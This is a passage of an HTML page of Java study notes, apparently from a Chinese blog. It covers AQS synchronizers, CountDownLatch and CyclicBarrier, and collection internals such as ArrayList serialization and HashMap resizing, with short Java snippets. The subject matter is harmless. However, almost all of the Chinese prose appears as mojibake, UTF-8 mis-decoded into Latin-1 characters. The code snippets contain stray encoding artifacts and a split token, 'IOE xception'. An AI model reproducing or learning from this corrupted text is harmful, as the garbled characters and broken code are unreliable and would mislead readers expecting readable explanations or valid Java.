<p>å†ä»¥ CountDownLatch ä»¥ä¾‹ï¼Œä»»åŠ¡åˆ†ä¸º N ä¸ªå­çº¿ç¨‹å»æ‰§è¡Œï¼Œstate ä¹Ÿåˆå§‹åŒ–ä¸º Nï¼ˆæ³¨æ„ N è¦ä¸çº¿ç¨‹ä¸ªæ•°ä¸€è‡´ï¼‰ã€‚è¿™ N ä¸ªå­çº¿ç¨‹æ˜¯å¹¶è¡Œæ‰§è¡Œçš„ï¼Œæ¯ä¸ªå­çº¿ç¨‹æ‰§è¡Œå®ŒåcountDown() ä¸€æ¬¡ï¼Œstate ä¼š CAS(Compare and Swap)å‡ 1ã€‚ç­‰åˆ°æ‰€æœ‰å­çº¿ç¨‹éƒ½æ‰§è¡Œå®Œå(å³ state&#x3D;0)ï¼Œä¼š unpark()ä¸»è°ƒç”¨çº¿ç¨‹ï¼Œç„¶åä¸»è°ƒç”¨çº¿ç¨‹å°±ä¼šä» await() å‡½æ•°è¿”å›ï¼Œç»§ç»­åä½™åŠ¨ä½œã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œè‡ªå®šä¹‰åŒæ­¥å™¨è¦ä¹ˆæ˜¯ç‹¬å æ–¹æ³•ï¼Œè¦ä¹ˆæ˜¯å…±äº«æ–¹å¼ï¼Œä»–ä»¬ä¹Ÿåªéœ€å®ç°tryAcquire-tryReleaseã€tryAcquireShared-tryReleaseSharedä¸­çš„ä¸€ç§å³å¯ã€‚ä½† AQS ä¹Ÿæ”¯æŒè‡ªå®šä¹‰åŒæ­¥å™¨åŒæ—¶å®ç°ç‹¬å å’Œå…±äº«ä¸¤ç§æ–¹å¼ï¼Œå¦‚ReentrantReadWriteLockã€‚</p>
<p>æ¨èä¸¤ç¯‡ AQS åŸç†å’Œç›¸å…³æºç åˆ†æçš„æ–‡ç« ï¼š</p>
<ul>
<li><a href="http://www.cnblogs.com/waterystone/p/4920797.html">http://www.cnblogs.com/waterystone/p/4920797.html</a></li>
<li><a href="https://www.cnblogs.com/chengxiao/archive/2017/07/24/7141160.html">https://www.cnblogs.com/chengxiao/archive/2017/07/24/7141160.html</a></li>
</ul>
<h3 id="AQSç»„ä»¶æ€»ç»“"><a href="#AQSç»„ä»¶æ€»ç»“" class="headerlink" title="AQSç»„ä»¶æ€»ç»“"></a>AQSç»„ä»¶æ€»ç»“</h3><ul>
<li>Semaphore(ä¿¡å·é‡)-å…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®ï¼š synchronized å’Œ ReentrantLock éƒ½æ˜¯ä¸€æ¬¡åªå…è®¸ä¸€ä¸ªçº¿ç¨‹è®¿é—®æŸä¸ªèµ„æºï¼ŒSemaphore(ä¿¡å·é‡)å¯ä»¥æŒ‡å®šå¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®æŸä¸ªèµ„æºã€‚</li>
<li>CountDownLatchï¼ˆå€’è®¡æ—¶å™¨ï¼‰ï¼š CountDownLatch æ˜¯ä¸€ä¸ªåŒæ­¥å·¥å…·ç±»ï¼Œç”¨æ¥åè°ƒå¤šä¸ªçº¿ç¨‹ä¹‹é—´çš„åŒæ­¥ã€‚è¿™ä¸ªå·¥å…·é€šå¸¸ç”¨æ¥æ§åˆ¶çº¿ç¨‹ç­‰å¾…ï¼Œå®ƒå¯ä»¥è®©æŸä¸€ä¸ªçº¿ç¨‹ç­‰å¾…ç›´åˆ°å€’è®¡æ—¶ç»“æŸï¼Œå†å¼€å§‹æ‰§è¡Œã€‚</li>
<li>CyclicBarrier(å¾ªç¯æ …æ )ï¼š CyclicBarrier å’Œ CountDownLatch éå¸¸ç±»ä¼¼ï¼Œå®ƒä¹Ÿå¯ä»¥å®ç°çº¿ç¨‹é—´çš„æŠ€æœ¯ç­‰å¾…ï¼Œä½†æ˜¯å®ƒçš„åŠŸèƒ½æ¯” CountDownLatch æ›´åŠ å¤æ‚å’Œå¼ºå¤§ã€‚ä¸»è¦åº”ç”¨åœºæ™¯å’Œ CountDownLatch ç±»ä¼¼ã€‚CyclicBarrier çš„å­—é¢æ„æ€æ˜¯å¯å¾ªç¯ä½¿ç”¨ï¼ˆCyclicï¼‰çš„å±éšœï¼ˆBarrierï¼‰ã€‚å®ƒè¦åšçš„äº‹æƒ…æ˜¯ï¼Œè®©ä¸€ç»„çº¿ç¨‹åˆ°è¾¾ä¸€ä¸ªå±éšœï¼ˆä¹Ÿå¯ä»¥å«åŒæ­¥ç‚¹ï¼‰æ—¶è¢«é˜»å¡ï¼Œç›´åˆ°æœ€åä¸€ä¸ªçº¿ç¨‹åˆ°è¾¾å±éšœæ—¶ï¼Œå±éšœæ‰ä¼šå¼€é—¨ï¼Œæ‰€æœ‰è¢«å±éšœæ‹¦æˆªçš„çº¿ç¨‹æ‰ä¼šç»§ç»­å¹²æ´»ã€‚CyclicBarrier é»˜è®¤çš„æ„é€ æ–¹æ³•æ˜¯ CyclicBarrier(int parties)ï¼Œå…¶å‚æ•°è¡¨ç¤ºå±éšœæ‹¦æˆªçš„çº¿ç¨‹æ•°é‡ï¼Œæ¯ä¸ªçº¿ç¨‹è°ƒç”¨ await() æ–¹æ³•å‘Šè¯‰ CyclicBarrier æˆ‘å·²ç»åˆ°è¾¾äº†å±éšœï¼Œç„¶åå½“å‰çº¿ç¨‹è¢«é˜»å¡ã€‚</li>
</ul>
<h3 id="ç”¨è¿‡CountDownLatchå—"><a href="#ç”¨è¿‡CountDownLatchå—" class="headerlink" title="ç”¨è¿‡CountDownLatchå—"></a>ç”¨è¿‡CountDownLatchå—</h3><p>CountDownLatch çš„ä½œç”¨å°±æ˜¯ å…è®¸ count ä¸ªçº¿ç¨‹é˜»å¡åœ¨ä¸€ä¸ªåœ°æ–¹ï¼Œç›´è‡³æ‰€æœ‰çº¿ç¨‹çš„ä»»åŠ¡éƒ½æ‰§è¡Œå®Œæ¯•ã€‚ä¹‹å‰åœ¨é¡¹ç›®ä¸­ï¼Œæœ‰ä¸€ä¸ªä½¿ç”¨å¤šçº¿ç¨‹è¯»å–å¤šä¸ªæ–‡ä»¶å¤„ç†çš„åœºæ™¯ï¼Œæˆ‘ç”¨åˆ°äº† CountDownLatch ã€‚å…·ä½“åœºæ™¯æ˜¯ä¸‹é¢è¿™æ ·çš„ï¼š</p>
<p>æˆ‘ä»¬è¦è¯»å–å¤„ç† 6 ä¸ªæ–‡ä»¶ï¼Œè¿™ 6 ä¸ªä»»åŠ¡éƒ½æ˜¯æ²¡æœ‰æ‰§è¡Œé¡ºåºä¾èµ–çš„ä»»åŠ¡ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦è¿”å›ç»™ç”¨æˆ·çš„æ—¶å€™å°†è¿™å‡ ä¸ªæ–‡ä»¶çš„å¤„ç†çš„ç»“æœè¿›è¡Œç»Ÿè®¡æ•´ç†ã€‚</p>
<p>ä¸ºæ­¤æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªçº¿ç¨‹æ± å’Œ count ä¸º 6 çš„CountDownLatchå¯¹è±¡ ã€‚ä½¿ç”¨çº¿ç¨‹æ± å¤„ç†è¯»å–ä»»åŠ¡ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹å¤„ç†å®Œä¹‹åå°±å°† count-1ï¼Œè°ƒç”¨CountDownLatchå¯¹è±¡çš„ await()æ–¹æ³•ï¼Œç›´åˆ°æ‰€æœ‰æ–‡ä»¶è¯»å–å®Œä¹‹åï¼Œæ‰ä¼šæ¥ç€æ‰§è¡Œåé¢çš„é€»è¾‘ã€‚</p>
<h1 id="å®¹å™¨"><a href="#å®¹å™¨" class="headerlink" title="å®¹å™¨"></a>å®¹å™¨</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848279.png" alt="img"></p>
<h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><p>åˆå§‹å¤§å°10,æ‰©å®¹å°±æ˜¯1.5å€å·¦å³, 15, 33 , 49;çº¿ç¨‹ä¸å®‰å…¨,é€‚ç”¨äºé¢‘ç¹çš„æŸ¥æ‰¾å·¥ä½œ;listå°¾éƒ¨ä¼šé¢„ç•™ä¸€äº›ç©ºé—´; æ’å…¥å’Œåˆ é™¤å…ƒç´ éœ€è¦å¤åˆ¶,æµªè´¹æ€§èƒ½; </p>
<p>å®ç°äº†RandomAccessæ¥å£(åœ¨ binarySearch()) æ–¹æ³•ä¸­ï¼Œå®ƒè¦åˆ¤æ–­ä¼ å…¥çš„ list æ˜¯å¦ RamdomAccess çš„å®ä¾‹ï¼Œå¦‚æœæ˜¯ï¼Œè°ƒç”¨indexedBinarySearch()æ–¹æ³•ï¼Œå¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆè°ƒç”¨iteratorBinarySearch()æ–¹æ³•);å®ç°äº†cloneableå’Œserializableæ¥å£</p>
<p>JDK7 newæ— å‚æ„é€ çš„ArrayListå¯¹è±¡æ—¶ï¼Œç›´æ¥åˆ›å»ºäº†é•¿åº¦æ˜¯10çš„Object[]æ•°ç»„elementData ã€‚jdk7ä¸­çš„ArrayListçš„å¯¹è±¡çš„åˆ›å»º<strong>ç±»ä¼¼äºå•ä¾‹çš„é¥¿æ±‰å¼</strong>ï¼Œè€Œjdk8ä¸­çš„ArrayListçš„å¯¹è±¡çš„åˆ›å»º<strong>ç±»ä¼¼äºå•ä¾‹çš„æ‡’æ±‰å¼</strong>ã€‚</p>
<h4 id="ä¸ºä»€ä¹ˆ-ArrayList-çš„-elementData-åŠ ä¸Š-transient-ä¿®é¥°ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆ-ArrayList-çš„-elementData-åŠ ä¸Š-transient-ä¿®é¥°ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆ ArrayList çš„ elementData åŠ ä¸Š transient ä¿®é¥°ï¼Ÿ"></a>ä¸ºä»€ä¹ˆ ArrayList çš„ elementData åŠ ä¸Š transient ä¿®é¥°ï¼Ÿ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 private transient Object[] elementData;</span><br></pre></td></tr></table></figure>

<p>å†çœ‹ä¸€ä¸‹ ArrayList çš„å®šä¹‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1	public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt;</span><br><span class="line">2	implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ° ArrayList å®ç°äº† Serializable æ¥å£ï¼Œè¿™æ„å‘³ç€ ArrayList æ”¯æŒåºåˆ—</p>
<p>åŒ–ã€‚transient çš„ä½œç”¨æ˜¯è¯´ä¸å¸Œæœ› elementData æ•°ç»„è¢«åºåˆ—åŒ–ï¼Œé‡å†™äº† writeObject å®ç°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 privateÂ voidÂ writeObject(java.io.ObjectOutputStreamÂ s)Â throwsÂ java.io.IOE xception&#123; </span><br><span class="line">2 Â *//Â WriteÂ outÂ elementÂ count,Â andÂ anyÂ hiddenÂ stuff* </span><br><span class="line">3 Â intÂ expectedModCountÂ =Â modCount; </span><br><span class="line">4 Â s.defaultWriteObject(); </span><br><span class="line">5 Â *//Â WriteÂ outÂ arrayÂ length* </span><br><span class="line">6 Â s.writeInt(elementData.length); </span><br><span class="line">7 Â *//Â WriteÂ outÂ allÂ elementsÂ inÂ theÂ properÂ order.* </span><br><span class="line">8 Â forÂ (intÂ i=0;Â i&lt;size;Â i++) </span><br><span class="line">9 Â s.writeObject(elementData[i]); </span><br><span class="line">10 Â ifÂ (modCountÂ !=Â expectedModCount)Â &#123; </span><br><span class="line">11 Â throwÂ newÂ ConcurrentModificationException();</span><br><span class="line">12 &#125;</span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡åºåˆ—åŒ–æ—¶ï¼Œå…ˆè°ƒç”¨ defaultWriteObject() æ–¹æ³•åºåˆ—åŒ– ArrayList ä¸­çš„étransient å…ƒç´ ï¼Œç„¶åéå† elementDataï¼Œåªåºåˆ—åŒ–å·²å­˜å…¥çš„å…ƒç´ ï¼Œè¿™æ ·æ—¢åŠ å¿«äº†åºåˆ—åŒ–çš„é€Ÿåº¦ï¼Œåˆå‡å°äº†åºåˆ—åŒ–ä¹‹åçš„æ–‡ä»¶å¤§å°ã€‚</p>
<h3 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h3><p>jdk1.6æ˜¯åŒå‘å¾ªç¯é“¾è¡¨,jdk1.7ä¸ºåŒå‘é“¾è¡¨;ä¸ä¿è¯çº¿ç¨‹å®‰å…¨;å­˜æ”¾å‰é©±å’Œåç»§çš„å¼•ç”¨ä¼šæµªè´¹ç©ºé—´;æ²¡æœ‰å®ç°RandomAccessæ¥å£;å®ç°Listæ¥å£å’ŒDequeæ¥å£;Collectionsç±»ä¸­çš„synchronizedListæ–¹æ³•;</p>
<h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>åˆå§‹å¤§å°ä¸º10,æ‰©å®¹æ˜¯2å€;listçš„å¤è€å®ç°ç±»;Vector çš„æ‰€æœ‰æ–¹æ³•åŠ ä¸Šäº† synchronized å…³é”®å­—,çº¿ç¨‹å®‰å…¨;</p>
<h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>ç»§æ‰¿è‡ªvector;çº¿ç¨‹å®‰å…¨;</p>
<h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>PriorityQueueæ˜¯éçº¿ç¨‹å®‰å…¨çš„ï¼Œæ‰€ä»¥Javaæä¾›äº†PriorityBlockingQueueï¼ˆå®ç°<a href="http://www.journaldev.com/1034/java-blockingqueue-example-implementing-producer-consumer-problem">BlockingQueueæ¥å£</a>ï¼‰ç”¨äº<a href="http://www.journaldev.com/1079/java-thread-tutorial">Javaå¤šçº¿ç¨‹ç¯å¢ƒ</a>;é»˜è®¤å°é¡¶å †å®ç°,åº•å±‚ä¸ºæ•°ç»„;</p>
<h3 id="ArrayDeque"><a href="#ArrayDeque" class="headerlink" title="ArrayDeque"></a>ArrayDeque</h3><p>åˆå§‹ä¸º16,æ‰©å®¹ä¸¤å€;åŒç«¯é˜Ÿåˆ—,åº•å±‚ä¸ºå¾ªç¯æ•°ç»„;ä¸èƒ½æ·»åŠ nullå€¼;addæ–¹æ³•å°±æ˜¯è°ƒç”¨addLastæ–¹æ³•;getLast,getFirst,addFirst,pollFirst,pollLast;åˆ¤æ–­é˜Ÿæ»¡(tail &#x3D; (tail + 1) &amp; (elements.length - 1)) &#x3D;&#x3D; head;</p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848289.png" alt="img" style="zoom: 67%;" />

<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>æ£€ç´¢å…ƒç´ æ•ˆç‡ä½ä¸‹ï¼Œåˆ é™¤å’Œæ’å…¥æ•ˆç‡é«˜ï¼Œæ’å…¥å’Œåˆ é™¤ä¸ä¼šå¼•èµ·å…ƒç´ ä½ç½®æ”¹å˜</p>
<h3 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h3><p>TreeSet åº•å±‚ä½¿ç”¨çº¢é»‘æ ‘ï¼Œèƒ½å¤ŸæŒ‰ç…§æ·»åŠ å…ƒç´ çš„é¡ºåºè¿›è¡Œéå†ï¼Œæ’åºçš„æ–¹å¼æœ‰è‡ªç„¶æ’åºå’Œå®šåˆ¶æ’åº;æœ‰åºçš„ï¼Œå¹¶ä¸”æ²¡æœ‰é‡å¤å…ƒç´ çš„é›†åˆ;éçº¿ç¨‹å®‰å…¨;å¯åºåˆ—åŒ–;</p>
<h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>HashMap ç›¸å¯¹äº  HashSet è¾ƒå¿«ï¼Œå› ä¸ºå®ƒæ˜¯ä½¿ç”¨å”¯ä¸€çš„é”®è·å–å¯¹è±¡;</p>
<p>HashSet åº•å±‚å°±æ˜¯åŸºäº HashMap å®ç°çš„ã€‚ï¼ˆHashSet çš„æºç éå¸¸éå¸¸å°‘ï¼Œå› ä¸ºé™¤äº† clone()ã€writeObject()ã€readObject()æ˜¯ HashSet è‡ªå·±ä¸å¾—ä¸å®ç°ä¹‹å¤–ï¼Œå…¶ä»–æ–¹æ³•éƒ½æ˜¯ç›´æ¥è°ƒç”¨ HashMap ä¸­çš„æ–¹æ³•ã€‚</p>
<table>
<thead>
<tr>
<th>HashMap</th>
<th>HashSet</th>
</tr>
</thead>
<tbody><tr>
<td>å®ç°äº† Map æ¥å£</td>
<td>å®ç° Set æ¥å£</td>
</tr>
<tr>
<td>å­˜å‚¨é”®å€¼å¯¹</td>
<td>ä»…å­˜å‚¨å¯¹è±¡</td>
</tr>
<tr>
<td>è°ƒç”¨ put()å‘ map ä¸­æ·»åŠ å…ƒç´ </td>
<td>è°ƒç”¨ add()æ–¹æ³•å‘ Set ä¸­æ·»åŠ å…ƒç´ </td>
</tr>
<tr>
<td>HashMap ä½¿ç”¨é”®ï¼ˆKeyï¼‰è®¡ç®— hashcode</td>
<td>HashSet ä½¿ç”¨æˆå‘˜å¯¹è±¡æ¥è®¡ç®— hashcode å€¼ï¼Œå¯¹äºä¸¤ä¸ªå¯¹è±¡æ¥è¯´ hashcode å¯èƒ½ç›¸åŒï¼Œæ‰€ä»¥equals()æ–¹æ³•ç”¨æ¥åˆ¤æ–­å¯¹è±¡çš„ç›¸ç­‰æ€§</td>
</tr>
</tbody></table>
<p>å½“ä½ æŠŠå¯¹è±¡åŠ å…¥HashSetæ—¶ï¼ŒHashSet ä¼šå…ˆè®¡ç®—å¯¹è±¡çš„hashcodeå€¼æ¥åˆ¤æ–­å¯¹è±¡åŠ å…¥çš„ä½ç½®ï¼ŒåŒæ—¶ä¹Ÿä¼šä¸å…¶ä»–åŠ å…¥çš„å¯¹è±¡çš„ hashcode å€¼ä½œæ¯”è¾ƒï¼Œå¦‚æœæ²¡æœ‰ç›¸ç¬¦çš„ hashcodeï¼ŒHashSet ä¼šå‡è®¾å¯¹è±¡æ²¡æœ‰é‡å¤å‡ºç°ã€‚ä½†æ˜¯å¦‚æœå‘ç°æœ‰ç›¸åŒ hashcode å€¼çš„å¯¹è±¡ï¼Œè¿™æ—¶ä¼šè°ƒç”¨equals()æ–¹æ³•æ¥æ£€æŸ¥ hashcode ç›¸ç­‰çš„å¯¹è±¡æ˜¯å¦çœŸçš„ç›¸åŒã€‚å¦‚æœä¸¤è€…ç›¸åŒï¼ŒHashSet å°±ä¸ä¼šè®©åŠ å…¥æ“ä½œæˆåŠŸã€‚</p>
<h3 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h3><p>LinkedHashSet æ˜¯ HashSet çš„å­ç±»ï¼Œèƒ½å¤ŸæŒ‰ç…§æ·»åŠ çš„é¡ºåºéå†ï¼›</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848337.png" alt="img"></p>
<h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>16 0.75 æ‰©å®¹ä¸º2å€,å°¾æ’æ³• (jdk1.7ç”¨å¤´æ’æ³•)æ¡¶å¤§äº64æ‰ä¼šæ ‘åŒ–,å½“æ¡¶å°äº64åˆ™å…ˆæ‰©å®¹ å•é“¾è¡¨ ;å…è®¸ä¸€ä¸ªkeyä¸ºnull,valueå¯ä»¥æœ‰å¤šä¸ªnull; 1.7 å…ˆåˆ¤æ–­æ˜¯å¦éœ€è¦æ‰©å®¹,å†æ’å…¥,1.8 å…ˆè¿›è¡Œæ’å…¥,æ’å…¥å®Œæˆå†åˆ¤æ–­æ˜¯å¦éœ€è¦æ‰©å®¹; 1.7æ²¡æœ‰çº¢é»‘æ ‘æœºåˆ¶;</p>
<p>æ‰©å®¹æœºåˆ¶(1.8) :</p>
<p>å‡è®¾åˆå§‹å®¹é‡ä¸º16, hash(key1) &#x3D; 0001,ç„¶åè®¡ç®—0001 &amp; 1111&#x3D; 1, å°¾æ’æ³•æ”¾åˆ°1å·ä½ç½®, hash(key2) &#x3D; 10001, ç„¶åè®¡ç®—10001 &amp; 1111 &#x3D; 1,å°¾æ’æ³•æ”¾åˆ°1å·ä½ç½®, æ­¤æ—¶æ‰©å®¹ä¸º32, å…ˆåˆ¤æ–­hash(key1) &amp; 16 &#x3D;&#x3D; 0? ç­‰äº0çš„éƒ½æ”¾åˆ°loheadè¿™é˜Ÿ, ç„¶åä¸ç­‰äº0çš„éƒ½æ”¾åˆ° hiheadè¿™ä¸€é˜Ÿ, loheadæ”¾åœ¨æ–°è¡¨çš„åŸæ¥çš„ä½ç½®, hiheadè¿™é˜Ÿæ”¾åˆ°æ–°è¡¨çš„j + oldCapä½ç½®(åŸæ¥çš„ä½ç½®åŠ ä¸Šæ—§è¡¨çš„å®¹é‡);å¯ä»¥é˜²æ­¢æ­»å¾ªç¯é—®é¢˜;</p>
<h4 id="HashMapä¸ºä»€ä¹ˆä¸åºåˆ—åŒ–table"><a href="#HashMapä¸ºä»€ä¹ˆä¸åºåˆ—åŒ–table" class="headerlink" title="HashMapä¸ºä»€ä¹ˆä¸åºåˆ—åŒ–table?"></a>HashMapä¸ºä»€ä¹ˆä¸åºåˆ—åŒ–table?</h4><p>æ¡¶æ•°ç»„è¢«transientä¿®é¥°,HashMap å¹¶æ²¡æœ‰ä½¿ç”¨é»˜è®¤çš„åºåˆ—åŒ–æœºåˆ¶ï¼Œè€Œæ˜¯é€šè¿‡å®ç°readObject&#x2F;writeObjectä¸¤ä¸ªæ–¹æ³•è‡ªå®šä¹‰äº†åºåˆ—åŒ–çš„å†…å®¹ã€‚è¿™æ ·åšæ˜¯æœ‰åŸå› çš„ï¼ŒHashMap ä¸­å­˜å‚¨çš„å†…å®¹æ˜¯é”®å€¼å¯¹ã€‚æ‰€ä»¥åªè¦æˆ‘ä»¬æŠŠé”®å€¼å¯¹åºåˆ—åŒ–äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®é”®å€¼å¯¹æ•°æ®é‡å»º HashMapã€‚æœ‰çš„æœ‹å‹å¯èƒ½ä¼šæƒ³ï¼Œåºåˆ—åŒ– table ä¸æ˜¯å¯ä»¥ä¸€æ­¥åˆ°ä½ï¼Œåé¢ç›´æ¥è¿˜åŸä¸å°±è¡Œäº†å—ï¼Ÿè¿™æ ·ä¸€æƒ³ï¼Œå€’ä¹Ÿæ˜¯åˆç†ã€‚ä½†åºåˆ—åŒ– talbe å­˜åœ¨ç€ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>table å¤šæ•°æƒ…å†µä¸‹æ˜¯æ— æ³•è¢«å­˜æ»¡çš„ï¼Œåºåˆ—åŒ–æœªä½¿ç”¨çš„éƒ¨åˆ†ï¼Œæµªè´¹ç©ºé—´</li>
<li>åŒä¸€ä¸ªé”®å€¼å¯¹åœ¨ä¸åŒ JVM ä¸‹ï¼Œæ‰€å¤„çš„æ¡¶ä½ç½®å¯èƒ½æ˜¯ä¸åŒçš„ï¼Œåœ¨ä¸åŒçš„ JVM ä¸‹ååºåˆ—åŒ– table å¯èƒ½ä¼šå‘ç”Ÿé”™è¯¯ã€‚</li>
</ol>
<p>HashMap çš„get&#x2F;put&#x2F;removeç­‰æ–¹æ³•ç¬¬ä¸€æ­¥å°±æ˜¯æ ¹æ® hashæ‰¾åˆ°é”®æ‰€åœ¨çš„æ¡¶ä½ç½®ï¼Œä½†å¦‚æœé”®æ²¡æœ‰è¦†å†™ hashCode æ–¹æ³•ï¼Œè®¡ç®—hash æ—¶æœ€ç»ˆè°ƒç”¨ Object ä¸­çš„ hashCode æ–¹æ³•ã€‚ä½†Object ä¸­çš„hashCodeæ–¹æ³•æ˜¯native å‹çš„ï¼Œä¸åŒçš„ JVMä¸‹ï¼Œå¯èƒ½ä¼šæœ‰ä¸åŒçš„å®ç°ï¼Œäº§ç”Ÿçš„ hash å¯èƒ½ä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ã€‚ä¹Ÿå°±æ˜¯è¯´åŒä¸€ä¸ªé”®åœ¨ä¸åŒå¹³å°ä¸‹å¯èƒ½ä¼šäº§ç”Ÿä¸åŒçš„ hashï¼Œæ­¤æ—¶å†å¯¹åœ¨åŒä¸€ä¸ª table ç»§ç»­æ“ä½œï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚</p>
<h4 id="hashmapçš„é•¿åº¦ä¸ºä»€ä¹ˆæ˜¯2çš„å¹‚æ¬¡æ–¹"><a href="#hashmapçš„é•¿åº¦ä¸ºä»€ä¹ˆæ˜¯2çš„å¹‚æ¬¡æ–¹" class="headerlink" title="hashmapçš„é•¿åº¦ä¸ºä»€ä¹ˆæ˜¯2çš„å¹‚æ¬¡æ–¹"></a>hashmapçš„é•¿åº¦ä¸ºä»€ä¹ˆæ˜¯2çš„å¹‚æ¬¡æ–¹</h4><p>ä¸ºäº†èƒ½è®© HashMap å­˜å–é«˜æ•ˆï¼Œå°½é‡è¾ƒå°‘ç¢°æ’ï¼Œä¹Ÿå°±æ˜¯è¦å°½é‡æŠŠæ•°æ®åˆ†é…å‡åŒ€ã€‚æˆ‘ä»¬ä¸Šé¢ä¹Ÿè®²åˆ°äº†è¿‡äº†ï¼ŒHash(éœ€è¦æ‰°åŠ¨) å€¼çš„èŒƒå›´å€¼-2147483648 åˆ° 2147483647ï¼Œå‰ååŠ èµ·æ¥å¤§æ¦‚ 40 äº¿çš„æ˜ å°„ç©ºé—´ï¼Œåªè¦å“ˆå¸Œå‡½æ•°æ˜ å°„å¾—æ¯”è¾ƒå‡åŒ€æ¾æ•£ï¼Œä¸€èˆ¬åº”ç”¨æ˜¯å¾ˆéš¾å‡ºç°ç¢°æ’çš„ã€‚ä½†é—®é¢˜æ˜¯ä¸€ä¸ª 40 äº¿é•¿åº¦çš„æ•°ç»„ï¼Œå†…å­˜æ˜¯æ”¾ä¸ä¸‹çš„ã€‚æ‰€ä»¥è¿™ä¸ªæ•£åˆ—å€¼æ˜¯ä¸èƒ½ç›´æ¥æ‹¿æ¥ç”¨çš„ã€‚ç”¨ä¹‹å‰è¿˜è¦å…ˆåšå¯¹æ•°ç»„çš„é•¿åº¦å–æ¨¡è¿ç®—ï¼Œå¾—åˆ°çš„ä½™æ•°æ‰èƒ½ç”¨æ¥è¦å­˜æ”¾çš„ä½ç½®ä¹Ÿå°±æ˜¯å¯¹åº”çš„æ•°ç»„ä¸‹æ ‡ã€‚è¿™ä¸ªæ•°ç»„ä¸‹æ ‡çš„è®¡ç®—æ–¹æ³•æ˜¯â€œ <code>(n - 1) &amp; hash</code>â€ã€‚ï¼ˆn ä»£è¡¨æ•°ç»„é•¿åº¦ï¼‰ã€‚è¿™ä¹Ÿå°±è§£é‡Šäº† HashMap çš„é•¿åº¦ä¸ºä»€ä¹ˆæ˜¯ 2 çš„å¹‚æ¬¡æ–¹ã€‚</p>
<p>è¿™ä¸ªç®—æ³•åº”è¯¥å¦‚ä½•è®¾è®¡å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬é¦–å…ˆå¯èƒ½ä¼šæƒ³åˆ°é‡‡ç”¨%å–ä½™çš„æ“ä½œæ¥å®ç°ã€‚ä½†æ˜¯ï¼Œé‡ç‚¹æ¥äº†ï¼šâ€œå–ä½™(%)æ“ä½œä¸­å¦‚æœé™¤æ•°æ˜¯ 2 çš„å¹‚æ¬¡åˆ™ç­‰ä»·äºä¸å…¶é™¤æ•°å‡ä¸€çš„ä¸(&amp;)æ“ä½œï¼ˆä¹Ÿå°±æ˜¯è¯´ hash%length&#x3D;&#x3D;hash&amp;(length-1)çš„å‰ææ˜¯ length æ˜¯ 2 çš„ n æ¬¡æ–¹ï¼›ï¼‰ã€‚â€ å¹¶ä¸” é‡‡ç”¨äºŒè¿›åˆ¶ä½æ“ä½œ &amp;ï¼Œç›¸å¯¹äº%èƒ½å¤Ÿæé«˜è¿ç®—æ•ˆç‡ï¼Œè¿™å°±è§£é‡Šäº† HashMap çš„é•¿åº¦ä¸ºä»€ä¹ˆæ˜¯ 2 çš„å¹‚æ¬¡æ–¹ã€‚</p>
<h4 id="HashMapå¤šçº¿ç¨‹æ“ä½œå¯¼è‡´æ­»å¾ªç¯é—®é¢˜"><a href="#HashMapå¤šçº¿ç¨‹æ“ä½œå¯¼è‡´æ­»å¾ªç¯é—®é¢˜" class="headerlink" title="HashMapå¤šçº¿ç¨‹æ“ä½œå¯¼è‡´æ­»å¾ªç¯é—®é¢˜"></a>HashMapå¤šçº¿ç¨‹æ“ä½œå¯¼è‡´æ­»å¾ªç¯é—®é¢˜</h4><p>ä¸»è¦åŸå› åœ¨äºå¹¶å‘ä¸‹çš„ Rehash ä¼šé€ æˆå…ƒç´ ä¹‹é—´ä¼šå½¢æˆä¸€ä¸ªå¾ªç¯é“¾è¡¨ã€‚ä¸è¿‡ï¼Œjdk 1.8 åè§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸å»ºè®®åœ¨å¤šçº¿ç¨‹ä¸‹ä½¿ç”¨ HashMap,å› ä¸ºå¤šçº¿ç¨‹ä¸‹ä½¿ç”¨ HashMap è¿˜æ˜¯ä¼šå­˜åœ¨å…¶ä»–é—®é¢˜æ¯”å¦‚æ•°æ®ä¸¢å¤±ã€‚å¹¶å‘ç¯å¢ƒä¸‹æ¨èä½¿ç”¨ 